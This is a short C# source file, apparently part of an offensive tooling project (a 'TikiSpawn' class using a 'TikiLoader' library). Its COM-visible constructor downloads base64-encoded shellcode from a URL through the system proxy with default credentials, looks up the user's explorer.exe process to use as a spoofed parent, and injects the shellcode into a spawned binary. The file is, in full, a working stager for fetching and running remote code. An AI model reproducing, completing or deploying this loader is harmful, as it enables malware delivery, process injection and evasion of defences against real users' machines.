﻿using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using TikiLoader;

[ComVisible(true)]
public class TikiSpawn
{

    public TikiSpawn()
    {
        Flame(@"", @"");
    }

    private static string GetData(string url)
    {
        WebClient client = new WebClient();
        client.Proxy = WebRequest.GetSystemWebProxy();
        client.Proxy.Credentials = CredentialCache.DefaultCredentials;
        return client.DownloadString(url);
    }

    public static int FindProcessPid(string process)
    {
        int pid = 0;

        int session = Process.GetCurrentProcess().SessionId;

        Process[] processes = Process.GetProcessesByName(process);

        foreach (Process proc in processes)
        {
            if (proc.SessionId == session)
            {
                pid = proc.Id;
            }
        }

        return pid;

    }

    private void Flame(string binary, string url)
    {
        byte[] shellcode = Convert.FromBase64String(GetData(url));
        int ppid = FindProcessPid("explorer");

        if (ppid == 0)
        {
            Console.WriteLine("[x] Couldn't get Explorer PID");
            Environment.Exit(1);
        }

        var ldr = new Loader();

        try
        {
            ldr.Load(binary, shellcode, ppid);
        }
        catch (Exception e)
        {
                Console.WriteLine("[x] Something went wrong! " + e.Message);
        }
    }
}